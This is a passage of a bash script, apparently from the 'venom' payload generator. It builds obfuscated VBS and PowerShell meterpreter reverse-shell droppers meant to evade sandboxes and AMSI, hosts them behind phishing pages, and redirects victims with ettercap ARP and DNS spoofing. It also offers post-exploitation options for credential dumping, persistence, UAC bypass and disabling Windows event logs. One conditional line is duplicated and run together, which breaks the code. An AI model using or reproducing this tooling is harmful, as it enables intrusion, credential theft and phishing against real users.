mv $IPATH/aux/msf/enigma_fileless_uac_bypass[bak].rb $IPATH/aux/msf/enigma_fileless_uac_bypass.rb > /dev/null 2>&1
mv $IPATH/aux/persistence[bak].rc $IPATH/aux/persistence.rc > /dev/null 2>&1
rm $IPATH/templates/phishing/copy.html > /dev/null 2>&1
rm $IPATH/output/chars.raw > /dev/null 2>&1
rm $ApAcHe/$N4m.bat > /dev/null 2>&1
rm $ApAcHe/index.html > /dev/null 2>&1
rm /tmp/Invoke-Phant0m.ps1 > /dev/null 2>&1
sleep 2
clear
cd $IPATH/

else

  echo ${RedF}[x]${white} Abort module execution ..${Reset};
  sleep 2
  sh_microsoft_menu
  clear
fi
}




# --------------------------------------------------------
# build shellcode in VBS (obfuscated using ANCII) 
# It was Working in 'Suryia Prakash' rat.vbs obfuscation
# that led me here... (build a vbs obfuscated payload) :D
# --------------------------------------------------------
sh_shellcode13 () {
# get user input to build shellcode
echo "[☠] Enter shellcode settings!"
lhost=$(zenity --title="☠ Enter LHOST ☠" --text "example: $IP" --entry --width 300) > /dev/null 2>&1
if [ "$?" -eq "0" ]; then
lport=$(zenity --title="☠ Enter LPORT ☠" --text "example: 666" --entry --width 300) > /dev/null 2>&1
N4m=$(zenity --title="☠ VBS NAME ☠" --text "example: Prakash" --entry --width 300) > /dev/null 2>&1
# input payload choise
paylo=$(zenity --list --title "☠ SHELLCODE GENERATOR ☠" --text "\nAvailable Payloads:" --radiolist --column "Pick" --column "Option" TRUE "windows/shell_bind_tcp" FALSE "windows/shell/reverse_tcp" FALSE "windows/meterpreter/reverse_tcp" FALSE "windows/meterpreter/reverse_tcp_dns" FALSE "windows/meterpreter/reverse_http" FALSE "windows/meterpreter/reverse_https" FALSE "windows/meterpreter/reverse_winhttps" FALSE "windows/x64/meterpreter/reverse_tcp" FALSE "windows/x64/meterpreter/reverse_https" --width 350 --height 370) > /dev/null 2>&1


## setting default values in case user have skip this ..
if [ -z "$lhost" ]; then lhost="$IP";fi
if [ -z "$lport" ]; then lport="443";fi
if [ -z "$N4m" ]; then N4m="Prakash";fi

echo "[☠] Building shellcode -> vbs format ..."
sleep 2
if [ "$paylo" = "windows/meterpreter/reverse_winhttps" ] || [ "$paylo" = "windows/meterpreter/reverse_https" ] || [ "$paylo" = "windows/x64/meterpreter/reverse_https" ]; then
   echo "[☠] meterpreter over SSL sellected ..";sleep 1
fi

# display final settings to user
cat << !

    venom settings
    ──────────────
    LPORT   : $lport
    LHOST   : $lhost
    FORMAT  : VBS -> WINDOWS
    PAYLOAD : $paylo

!

# use metasploit to build shellcode
if [ "$paylo" = "windows/meterpreter/reverse_winhttps" ] || [ "$paylo" = "windows/meterpreter/reverse_https" ] || [ "$paylo" = "windows/x64/meterpreter/reverse_https" ]; then
   xterm -T " SHELLCODE GENERATOR " -geometry 110x23 -e "msfvenom -p $paylo LHOST=$lhost LPORT=$lport HandlerSSLCert=$IPATH/obfuscate/www.gmail.com.pem StagerVerifySSLCert=true -f vbs > $IPATH/obfuscate/$N4m.vbs"
else
   xterm -T " SHELLCODE GENERATOR " -geometry 110x23 -e "msfvenom -p $paylo LHOST=$lhost LPORT=$lport -f vbs > $IPATH/obfuscate/$N4m.vbs" > /dev/null 2>&1
fi


cat $IPATH/obfuscate/$N4m.vbs | grep '"' | awk {'print $3'} | cut -d '=' -f1
# obfuscating payload.vbs
echo "[☠] Obfuscating sourcecode..."
sleep 2
cd $IPATH/obfuscate/
xterm -T " VBS-OBFUSCATOR.PY " -geometry 110x23 -e "python vbs-obfuscator.py $N4m.vbs final.vbs"
cp final.vbs $IPATH/output/$N4m.vbs > /dev/null 2>&1
rm $N4m.vbs > /dev/null 2>&1
echo "[☠] Injecting shellcode -> $N4m.vbs!"
sleep 2
cd $IPATH/

# CHOSE HOW TO DELIVER YOUR PAYLOAD
serv=$(zenity --list --title "☠ SHELLCODE GENERATOR ☠" --text "PAYLOAD STORED UNDER:\n$IPATH/output/$N4m.vbs" --radiolist --column "Pick" --column "Option" TRUE "multi-handler (default)" FALSE "apache2 (malicious url)" --width 305 --height 180) > /dev/null 2>&1


   if [ "$serv" = "multi-handler (default)" ]; then
     # START METASPLOIT LISTENNER (multi-handler with the rigth payload)
     echo "[☠] Start a multi-handler..."
     echo "[☠] Press [ctrl+c] or [exit] to 'exit' meterpreter shell"
     echo "[☯] Please dont test samples on virus total..."
       if [ "$MsFlF" = "ON" ]; then

         if [ "$paylo" = "windows/meterpreter/reverse_winhttps" ] || [ "$paylo" = "windows/meterpreter/reverse_https" ] || [ "$paylo" = "windows/x64/meterpreter/reverse_https" ]; then
           xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'spool $IPATH/output/report.log; use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; set HandlerSSLCert $IPATH/obfuscate/www.gmail.com.pem; set StagerVerifySSLCert true; exploit'"
         else
           xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'spool $IPATH/output/report.log; use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; exploit'"
         fi

         cd $IPATH/output
         # delete utf-8/non-ancii caracters from output
         tr -cd '\11\12\15\40-\176' < report.log > final.log
         sed -i "s/\[0m//g" final.log
         sed -i "s/\[1m\[34m//g" final.log
         sed -i "s/\[4m//g" final.log
         sed -i "s/\[K//g" final.log
         sed -i "s/\[1m\[31m//g" final.log
         sed -i "s/\[1m\[32m//g" final.log
         sed -i "s/\[1m\[33m//g" final.log
         mv final.log $N4m-$lhost.log > /dev/null 2>&1
         rm report.log > /dev/null 2>&1
         cd $IPATH/
       else

         if [ "$paylo" = "windows/meterpreter/reverse_winhttps" ] || [ "$paylo" = "windows/meterpreter/reverse_https" ] || [ "$paylo" = "windows/x64/meterpreter/reverse_https" ]; then
           xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; set HandlerSSLCert $IPATH/obfuscate/www.gmail.com.pem; set StagerVerifySSLCert true; exploit'"
         else
           xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; exploit'"
         fi
       fi


   else


P0=$(zenity --list --title "☠ SHELLCODE GENERATOR ☠" --text "\npost-exploitation module to run" --radiolist --column "Pick" --column "Option" TRUE "sysinfo.rc" FALSE "enum_system.rc" FALSE "dump_credentials.rc" FALSE "fast_migrate.rc" FALSE "persistence.rc" FALSE "privilege_escalation.rc" FALSE "stop_logfiles_creation.rc" FALSE "exploit_suggester.rc" --width 305 --height 350) > /dev/null 2>&1


  if [ "$P0" = "stop_logfiles_creation.rc" ]; then
    #
    # check if dependencies exist ..
    #
    if [ -e "$pHanTom/post/windows/manage/Invoke-Phant0m.rb" ]; then
      echo "[☠] Invoke-Phant0m.rb installed .."
      sleep 2
    else
      echo "[x] Invoke-Phant0m.rb not found .."
      sleep 2
      echo "[☠] copy Invoke-Phant0m.rb to msfdb .."
      sleep 2
      cp $IPATH/aux/msf/Invoke-Phant0m.rb $pHanTom/post/windows/manage/Invoke-Phant0m.rb > /dev/null 2>&1
      echo "[☠] Reloading msfdb database .."
      sleep 2
      xterm -T "RELOADING MSF DATABASE" -geometry 110x23 -e "msfdb reinit" > /dev/null 2>&1
      xterm -T "RELOADING MSF DATABASE" -geometry 110x23 -e "msfconsole -q -x 'db_status; reload_all; exit -y'" > /dev/null 2>&1
    fi

      #
      # check if Invoke-Phantom.ps1 exists ..
      #
      if [ -e "$IPATH/aux/Invoke-Phant0m.ps1" ]; then
        echo "[☠] Invoke-Phant0m.ps1 found .."
        sleep 2
        cp $IPATH/aux/Invoke-Phant0m.ps1 /tmp/Invoke-Phant0m.ps1 > /dev/null 2>&1
      else
        echo "[x] Invoke-Phant0m.ps1 not found .."
        sleep 2
        echo "[☠] Please place module in $IPATH/aux folder .."
        sleep 2
        exit
      fi
  fi


# ZIP payload files before sending? (apache2)
rUn=$(zenity --question --title="☠ SHELLCODE GENERATOR ☠" --text "Zip payload files?" --width 270) > /dev/null 2>&1
    if [ "$?" -eq "0" ]; then
      # edit files nedded
      cd $IPATH/templates/phishing
      cp $InJEc12 mega[bak].html
      sed "s|NaM3|$N4m.zip|g" mega.html > copy.html
      mv copy.html $ApAcHe/index.html > /dev/null 2>&1
      # copy from output
      cd $IPATH/output
      echo "[☠] creating archive -> $N4m.zip"
      zip $N4m.zip $N4m.vbs > /dev/null 2>&1
      cp $N4m.zip $ApAcHe/$N4m.zip > /dev/null 2>&1
      echo "[☠] loading -> Apache2Server!"
      echo "---"
      echo "- SEND THE URL GENERATED TO TARGET HOST"
    else
      # edit files nedded
      cd $IPATH/templates/phishing
      cp $InJEc12 mega[bak].html
      sed "s|NaM3|$N4m.vbs|g" mega.html > copy.html
      mv copy.html $ApAcHe/index.html > /dev/null 2>&1
      # copy from output
      cd $IPATH/output
      cp $N4m.vbs $ApAcHe/$N4m.vbs > /dev/null 2>&1
      echo "[☠] loading -> Apache2Server!"
      echo "---"
      echo "- SEND THE URL GENERATED TO TARGET HOST"
    fi

        if [ "$D0M4IN" = "YES" ]; then
        echo "- ATTACK VECTOR: http://mega-upload.com"
        echo "- POST EXPLOIT : $P0"
        echo "---"
        # START METASPLOIT LISTENNER (multi-handler with the rigth payload)
        echo "[☠] Start a multi-handler..."
        echo "[☠] Press [ctrl+c] or [exit] to 'exit' meterpreter shell"
        echo "[☯] Please dont test samples on virus total..."
          if [ "$MsFlF" = "ON" ]; then

            if [ "$paylo" = "windows/meterpreter/reverse_winhttps" ] || [ "$paylo" = "windows/meterpreter/reverse_https" ] || [ "$paylo" = "windows/x64/meterpreter/reverse_https" ]; then
              xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'spool $IPATH/output/report.log; use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; set HandlerSSLCert $IPATH/obfuscate/www.gmail.com.pem; set StagerVerifySSLCert true; set AutoRunScript multi_console_command -r $IPATH/aux/$P0; exploit'" & xterm -T " DNS_SPOOF [redirecting traffic] " -geometry 110x10 -e "sudo ettercap -T -q -i $InT3R -P dns_spoof -M ARP // //"
            else
              xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'spool $IPATH/output/report.log; use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; set AutoRunScript multi_console_command -r $IPATH/aux/$P0; exploit'" & xterm -T " DNS_SPOOF [redirecting traffic] " -geometry 110x10 -e "sudo ettercap -T -q -i $InT3R -P dns_spoof -M ARP // //"
            fi

            cd $IPATH/output
            # delete utf-8/non-ancii caracters from output
            tr -cd '\11\12\15\40-\176' < report.log > final.log
            sed -i "s/\[0m//g" final.log
            sed -i "s/\[1m\[34m//g" final.log
            sed -i "s/\[4m//g" final.log
            sed -i "s/\[K//g" final.log
            sed -i "s/\[1m\[31m//g" final.log
            sed -i "s/\[1m\[32m//g" final.log
            sed -i "s/\[1m\[33m//g" final.log
            mv final.log $N4m-$lhost.log > /dev/null 2>&1
            rm report.log > /dev/null 2>&1
            cd $IPATH/
          else

            if [ "$paylo" = "windows/meterpreter/reverse_winhttps" ] || [ "$paylo" = "windows/meterpreter/reverse_https" ] || [ "$paylo" = "windows/x64/meterpreter/reverse_https" ]; then
              xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; set HandlerSSLCert $IPATH/obfuscate/www.gmail.com.pem; set StagerVerifySSLCert true; set AutoRunScript multi_console_command -r $IPATH/aux/$P0; exploit'" & xterm -T " DNS_SPOOF [redirecting traffic] " -geometry 110x10 -e "sudo ettercap -T -q -i $InT3R -P dns_spoof -M ARP // //"
            else
              xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; set AutoRunScript multi_console_command -r $IPATH/aux/$P0; exploit'" & xterm -T " DNS_SPOOF [redirecting traffic] " -geometry 110x10 -e "sudo ettercap -T -q -i $InT3R -P dns_spoof -M ARP // //"
            fi
          fi


        else


        echo "- ATTACK VECTOR: http://$lhost"
        echo "- POST EXPLOIT : $P0"
        echo "---"
        # START METASPLOIT LISTENNER (multi-handler with the rigth payload)
        echo "[☠] Start a multi-handler..."
        echo "[☠] Press [ctrl+c] or [exit] to 'exit' meterpreter shell"
        echo "[☯] Please dont test samples on virus total..."
          if [ "$MsFlF" = "ON" ]; then

            if [ "$paylo" = "windows/meterpreter/reverse_winhttps" ] || [ "$paylo" = "windows/meterpreter/reverse_https" ] || [ "$paylo" = "windows/x64/meterpreter/reverse_https" ]; then
              xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'spool $IPATH/output/report.log; use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; set HandlerSSLCert $IPATH/obfuscate/www.gmail.com.pem; set StagerVerifySSLCert true; set AutoRunScript multi_console_command -r $IPATH/aux/$P0; exploit'"
            else
              xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'spool $IPATH/output/report.log; use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; set AutoRunScript multi_console_command -r $IPATH/aux/$P0; exploit'"
            fi

            cd $IPATH/output
            # delete utf-8/non-ancii caracters from output
            tr -cd '\11\12\15\40-\176' < report.log > final.log
            sed -i "s/\[0m//g" final.log
            sed -i "s/\[1m\[34m//g" final.log
            sed -i "s/\[4m//g" final.log
            sed -i "s/\[K//g" final.log
            sed -i "s/\[1m\[31m//g" final.log
            sed -i "s/\[1m\[32m//g" final.log
            sed -i "s/\[1m\[33m//g" final.log
            mv final.log $N4m-$lhost.log > /dev/null 2>&1
            rm report.log > /dev/null 2>&1
            cd $IPATH/
          else

            if [ "$paylo" = "windows/meterpreter/reverse_winhttps" ] || [ "$paylo" = "windows/meterpreter/reverse_https" ] || [ "$paylo" = "windows/x64/meterpreter/reverse_https" ]; then
              xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; set HandlerSSLCert $IPATH/obfuscate/www.gmail.com.pem; set StagerVerifySSLCert true; set AutoRunScript multi_console_command -r $IPATH/aux/$P0; exploit'"
            else
              xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; set AutoRunScript multi_console_command -r $IPATH/aux/$P0; exploit'"
            fi
          fi
        fi
   fi


# CLEANING EVERYTHING UP
echo "[☠] Cleanning temp generated files..."
sleep 2
mv $IPATH/templates/phishing/mega[bak].html $InJEc12 > /dev/null 2>&1
rm $IPATH/obfuscate/final.vbs > /dev/null 2>&1
rm $IPATH/templates/phishing/copy.html > /dev/null 2>&1
rm $ApAcHe/$N4m.zip > /dev/null 2>&1
rm $ApAcHe/$N4m.vbs > /dev/null 2>&1
rm $ApAcHe/index.html > /dev/null 2>&1
rm /tmp/Invoke-Phant0m.ps1 > /dev/null 2>&1
cd $IPATH/

else

  echo ${RedF}[x]${white} Abort module execution ..${Reset};
  sleep 2
  sh_microsoft_menu
  clear
fi
}





# ----------------------------------------------------
# build shellcode in PSH-CMD (powershell base64 enc)
# embbebed into one .vbs template
# ----------------------------------------------------
sh_shellcode14 () {
# get user input to build shellcode
echo "[☠] Enter shellcode settings!"
lhost=$(zenity --title="☠ Enter LHOST ☠" --text "example: $IP" --entry --width 300) > /dev/null 2>&1
if [ "$?" -eq "0" ]; then
lport=$(zenity --title="☠ Enter LPORT ☠" --text "example: 666" --entry --width 300) > /dev/null 2>&1
N4m=$(zenity --entry --title "☠ SHELLCODE NAME ☠" --text "Enter shellcode output name\nexample: notepad" --width 300) > /dev/null 2>&1
# input payload choise
paylo=$(zenity --list --title "☠ SHELLCODE GENERATOR ☠" --text "\nAvailable Payloads:" --radiolist --column "Pick" --column "Option" TRUE "windows/shell_bind_tcp" FALSE "windows/shell/reverse_tcp" FALSE "windows/meterpreter/reverse_tcp" FALSE "windows/meterpreter/reverse_tcp_dns" FALSE "windows/meterpreter/reverse_http" FALSE "windows/meterpreter/reverse_https" FALSE "windows/meterpreter/reverse_winhttps" FALSE "windows/x64/meterpreter/reverse_tcp" FALSE "windows/x64/meterpreter/reverse_https" --width 350 --height 370) > /dev/null 2>&1


## setting default values in case user have skip this ..
if [ -z "$lhost" ]; then lhost="$IP";fi
if [ -z "$lport" ]; then lport="443";fi
if [ -z "$N4m" ]; then N4m="notepad";fi

echo "[☠] Building shellcode -> psh-cmd format ..."
sleep 2
if [ "$paylo" = "windows/meterpreter/reverse_winhttps" ] || [ "$paylo" = "windows/meterpreter/reverse_https" ] || [ "$paylo" = "windows/x64/meterpreter/reverse_https" ]; then
   echo "[☠] meterpreter over SSL sellected ..";sleep 1
fi


# display final settings to user
cat << !

    venom settings
    ──────────────
    LPORT   : $lport
    LHOST   : $lhost
    FORMAT  : PSH-CMD -> WINDOWS
    PAYLOAD : $paylo

!

# use metasploit to build shellcode
if [ "$paylo" = "windows/meterpreter/reverse_winhttps" ] || [ "$paylo" = "windows/meterpreter/reverse_https" ] || [ "$paylo" = "windows/x64/meterpreter/reverse_https" ]; then
   xterm -T " SHELLCODE GENERATOR " -geometry 110x23 -e "msfvenom -p $paylo LHOST=$lhost LPORT=$lport HandlerSSLCert=$IPATH/obfuscate/www.gmail.com.pem StagerVerifySSLCert=true -f psh-cmd > $IPATH/output/chars.raw"
else
   xterm -T " SHELLCODE GENERATOR " -geometry 110x23 -e "msfvenom -p $paylo LHOST=$lhost LPORT=$lport -f psh-cmd > $IPATH/output/chars.raw"
fi


# display shellcode
disp=`cat $IPATH/output/chars.raw | awk {'print $12'}`
echo ""
echo "[☠] obfuscating -> base64 encoded!"
sleep 2
echo $disp
echo ""
sleep 2


# EDITING/BACKUP FILES NEEDED
echo ""
echo "[☠] editing/backup files..."
sleep 2

   # check if chars.raw as generated
   if [ -e $Ch4Rs ]; then
      echo "[☠] chars.raw -> found!"
      sleep 2
 
   else

      echo "[☠] chars.raw -> not found!"
      exit
      fi

OBF=$(zenity --list --title "☠ AGENT STRING OBFUSCATION ☠" --text "Obfuscate the agent [ template ] command arguments ?\nUsing special escape characters, whitespaces, concaternation, amsi\nsandbox evasion and variables piped and de-obfuscated at runtime\n'The agent will delay is execution to evade sandbox detection (msgbox)'" --radiolist --column "Pick" --column "Option" TRUE "None-Obfuscation (default)" FALSE "String Obfuscation (3 sec)" --width 353 --height 245) > /dev/null 2>&1


if [ "$OBF" = "None-Obfuscation (default)" ]; then
   # check if exec.vbs as generated
   if [ -e $IPATH/templates/exec.vbs ]; then
      echo "[☠] exec.vbs  -> found!"
      sleep 2
 
   else

      echo "[☠] exec.vbs  -> not found!"
      exit
      fi

# injecting shellcode into name
cd $IPATH/templates/
echo "[☠] Injecting shellcode -> $N4m.vbs!"
sleep 2
sed "s|InJ3C|$disp|" exec.vbs > $N4m.vbs
mv $N4m.vbs $IPATH/output/$N4m.vbs
chmod +x $IPATH/output/$N4m.vbs

else
echo "[✔] String obfuscation technic sellected .."
sleep 2
echo "[☠] Injecting shellcode -> $N4m.vbs!"
sleep 2
#
# STRING: powershell.exe -wIN 1 -noP -noNI -eN $disp
#
echo "dIm i0dIfQ,f0wBiQ,U1kJi0,dIb0fQ:U1kJi0=\"/wINe\"+\"NPoW\"&\"eR1nO\"+\"PSh\"&\"ElLn\"+\"oNI\":i0dIfQ=rEpLaCe(\"In\"&\"si0al\"+\"ling up\"&\"da\"+\"i0es.\",\"i0\",\"t\"):mSgbOx i0dIfQ:f0wBiQ=mid(U1kJi0,7,5)&MiD(U1kJi0,16,5)&\" \"&mId(U1kJi0,1,4)&\" 1 \"&mId(U1kJi0,1,1)&MiD(U1kJi0,13,3)&\" \"&mId(U1kJi0,1,1)&mId(U1kJi0,21,4)&\" \"&mId(U1kJi0,1,1)&mId(U1kJi0,5,2)&\" $disp\":sEt dIb0fQ=cReAtEObJeCt(\"\"+\"W\"&\"sCr\"+\"Ip\"&\"t.Sh\"+\"El\"&\"L\"):dIb0fQ.rUn f0wBiQ" > $IPATH/output/$N4m.vbs
cd $IPATH/output
fi

# CHOSE HOW TO DELIVER YOUR PAYLOAD
serv=$(zenity --list --title "☠ SHELLCODE GENERATOR ☠" --text "Payload stored:\n$IPATH/output/$N4m.vbs\n\nExecute: press 2 times to 'execute'\n\nchose how to deliver: $N4m.vbs" --radiolist --column "Pick" --column "Option" TRUE "multi-handler (default)" FALSE "apache2 (malicious url)" --width 305 --height 260) > /dev/null 2>&1

   if [ "$serv" = "multi-handler (default)" ]; then
      # START METASPLOIT LISTENNER (multi-handler with the rigth payload)
      echo "[☠] Start a multi-handler..."
      echo "[☠] Press [ctrl+c] or [exit] to 'exit' meterpreter shell"
      echo "[☯] Please dont test samples on virus total..."
        if [ "$MsFlF" = "ON" ]; then

          if [ "$paylo" = "windows/meterpreter/reverse_winhttps" ] || [ "$paylo" = "windows/meterpreter/reverse_https" ] || [ "$paylo" = "windows/x64/meterpreter/reverse_https" ]; then
            xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'spool $IPATH/output/report.log; use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; set HandlerSSLCert $IPATH/obfuscate/www.gmail.com.pem; set StagerVerifySSLCert true; exploit'"
          else
            xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'spool $IPATH/output/report.log; use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; exploit'"
          fi

          cd $IPATH/output
          # delete utf-8/non-ancii caracters from output
          tr -cd '\11\12\15\40-\176' < report.log > final.log
          sed -i "s/\[0m//g" final.log
          sed -i "s/\[1m\[34m//g" final.log
          sed -i "s/\[4m//g" final.log
          sed -i "s/\[K//g" final.log
          sed -i "s/\[1m\[31m//g" final.log
          sed -i "s/\[1m\[32m//g" final.log
          sed -i "s/\[1m\[33m//g" final.log
          mv final.log $N4m-$lhost.log > /dev/null 2>&1
          rm report.log > /dev/null 2>&1
          cd $IPATH/
        else

           if [ "$paylo" = "windows/meterpreter/reverse_winhttps" ] || [ "$paylo" = "windows/meterpreter/reverse_https" ] || [ "$paylo" = "windows/x64/meterpreter/reverse_https" ]; then
             xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; set HandlerSSLCert $IPATH/obfuscate/www.gmail.com.pem; set StagerVerifySSLCert true; exploit'"
           else
             xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; exploit'"
           fi
        fi
      sleep 2


   else


P0=$(zenity --list --title "☠ SHELLCODE GENERATOR ☠" --text "\npost-exploitation module to run" --radiolist --column "Pick" --column "Option" TRUE "sysinfo.rc" FALSE "enum_system.rc" FALSE "dump_credentials.rc" FALSE "fast_migrate.rc" FALSE "persistence.rc" FALSE "privilege_escalation.rc" FALSE "stop_logfiles_creation.rc" FALSE "exploit_suggester.rc" --width 305 --height 350) > /dev/null 2>&1

  if [ "$P0" = "persistence.rc" ]; then
  M1P=$(zenity --entry --title "☠ AUTO-START PAYLOAD ☠" --text "\nAuto-start payload Every specified hours 1-23\n\nexample: 23\nwill auto-start $N4m.vbs on target every 23 hours" --width 300) > /dev/null 2>&1

    cd $IPATH/aux
    # Build persistence script (AutoRunStart='multi_console_command -r')
    cp persistence.rc persistence[bak].rc
    sed -i "s|N4m|$N4m.vbs|g" persistence.rc
    sed -i "s|IPATH|$IPATH|g" persistence.rc
    sed -i "s|M1P|$M1P|g" persistence.rc

    # Build listenner resource file
    echo "use exploit/multi/handler" > $lhost.rc
    echo "set LHOST $lhost" >> $lhost.rc
    echo "set LPORT $lport" >> $lhost.rc
    echo "set PAYLOAD $paylo" >> $lhost.rc
    echo "exploit" >> $lhost.rc
    mv $lhost.rc $IPATH/output/$lhost.rc
    cd $IPATH

    elif [ "$P0" = "privilege_escalation.rc" ]; then
      cd $IPATH/aux
      # backup files needed
      cp privilege_escalation.rc privilege_escalation[bak].rc
      cp enigma_fileless_uac_bypass.rb enigma_fileless_uac_bypass[bak].rb
      # Build resource files needed
      sed -i "s|N4m|$N4m.vbs|g" privilege_escalation.rc
      sed -i "s|IPATH|$IPATH|g" privilege_escalation.rc
      sed -i "s|N4m|$N4m.vbs|g" enigma_fileless_uac_bypass.rb
      # reload metasploit database
      echo "[☠] copy post-module to msf db!"
      cp enigma_fileless_uac_bypass.rb $pHanTom/post/windows/escalate/enigma_fileless_uac_bypass.rb
      echo "[☠] reloading -> Metasploit database!"
      xterm -T " reloading -> Metasploit database " -geometry 110x23 -e "sudo msfconsole -x 'reload_all; exit -y'" > /dev/null 2>&1
      cd $IPATH


  elif [ "$P0" = "stop_logfiles_creation.rc" ]; then
    #
    # check if dependencies exist ..
    #
    if [ -e "$pHanTom/post/windows/manage/Invoke-Phant0m.rb" ]; then
      echo "[☠] Invoke-Phant0m.rb installed .."
      sleep 2
    else
      echo "[x] Invoke-Phant0m.rb not found .."
      sleep 2
      echo "[☠] copy Invoke-Phant0m.rb to msfdb .."
      sleep 2
      cp $IPATH/aux/msf/Invoke-Phant0m.rb $pHanTom/post/windows/manage/Invoke-Phant0m.rb > /dev/null 2>&1
      echo "[☠] Reloading msfdb database .."
      sleep 2
      xterm -T "RELOADING MSF DATABASE" -geometry 110x23 -e "msfdb reinit" > /dev/null 2>&1
      xterm -T "RELOADING MSF DATABASE" -geometry 110x23 -e "msfconsole -q -x 'db_status; reload_all; exit -y'" > /dev/null 2>&1
    fi

      #
      # check if Invoke-Phantom.ps1 exists ..
      #
      if [ -e "$IPATH/aux/Invoke-Phant0m.ps1" ]; then
        echo "[☠] Invoke-Phant0m.ps1 found .."
        sleep 2
        cp $IPATH/aux/Invoke-Phant0m.ps1 /tmp/Invoke-Phant0m.ps1 > /dev/null 2>&1
      else
        echo "[x] Invoke-Phant0m.ps1 not found .."
        sleep 2
        echo "[☠] Please place module in $IPATH/aux folder .."
        sleep 2
        exit
      fi


  else

    echo "do nothing" > /dev/null 2>&1

fi


# ZIP payload files before sending? (apache2)
rUn=$(zenity --question --title="☠ SHELLCODE GENERATOR ☠" --text "Zip payload files?" --width 270) > /dev/null 2>&1
    if [ "$?" -eq "0" ]; then
      # edit files nedded
      cd $IPATH/templates/phishing
      cp $InJEc12 mega[bak].html
      sed "s|NaM3|$N4m.zip|g" mega.html > copy.html
      mv copy.html $ApAcHe/index.html > /dev/null 2>&1
      # copy from output
      cd $IPATH/output
      echo "[☠] creating archive -> $N4m.zip"
      zip $N4m.zip $N4m.vbs > /dev/null 2>&1
      cp $N4m.zip $ApAcHe/$N4m.zip > /dev/null 2>&1
      echo "[☠] loading -> Apache2Server!"
      echo "---"
      echo "- SEND THE URL GENERATED TO TARGET HOST"
    else
      # edit files nedded
      cd $IPATH/templates/phishing
      cp $InJEc12 mega[bak].html
      sed "s|NaM3|$N4m.vbs|g" mega.html > copy.html
      mv copy.html $ApAcHe/index.html > /dev/null 2>&1
      # copy from output
      cd $IPATH/output
      cp $N4m.vbs $ApAcHe/$N4m.vbs > /dev/null 2>&1
      echo "[☠] loading -> Apache2Server!"
      echo "---"
      echo "- SEND THE URL GENERATED TO TARGET HOST"
    fi


        if [ "$D0M4IN" = "YES" ]; then
        echo "- ATTACK VECTOR: http://mega-upload.com"
        echo "- POST EXPLOIT : $P0"
        echo "---"
        # START METASPLOIT LISTENNER (multi-handler with the rigth payload)
        echo "[☠] Start a multi-handler..."
        echo "[☠] Press [ctrl+c] or [exit] to 'exit' meterpreter shell"
        echo "[☯] Please dont test samples on virus total..."
          if [ "$MsFlF" = "ON" ]; then

            if [ "$paylo" = "windows/meterpreter/reverse_winhttps" ] || [ "$paylo" = "windows/meterpreter/reverse_https" ]; thenif [ "$paylo" = "windows/meterpreter/reverse_winhttps" ] || [ "$paylo" = "windows/meterpreter/reverse_https" ] || [ "$paylo" = "windows/x64/meterpreter/reverse_https" ]; then
              xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'spool $IPATH/output/report.log; use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; set HandlerSSLCert $IPATH/obfuscate/www.gmail.com.pem; set StagerVerifySSLCert true; set AutoRunScript multi_console_command -r $IPATH/aux/$P0; exploit'" & xterm -T " DNS_SPOOF [redirecting traffic] " -geometry 110x10 -e "sudo ettercap -T -q -i $InT3R -P dns_spoof -M ARP // //"
            else
              xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'spool $IPATH/output/report.log; use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; set AutoRunScript multi_console_command -r $IPATH/aux/$P0; exploit'" & xterm -T " DNS_SPOOF [redirecting traffic] " -geometry 110x10 -e "sudo ettercap -T -q -i $InT3R -P dns_spoof -M ARP // //"
            fi

            cd $IPATH/output
            # delete utf-8/non-ancii caracters from output
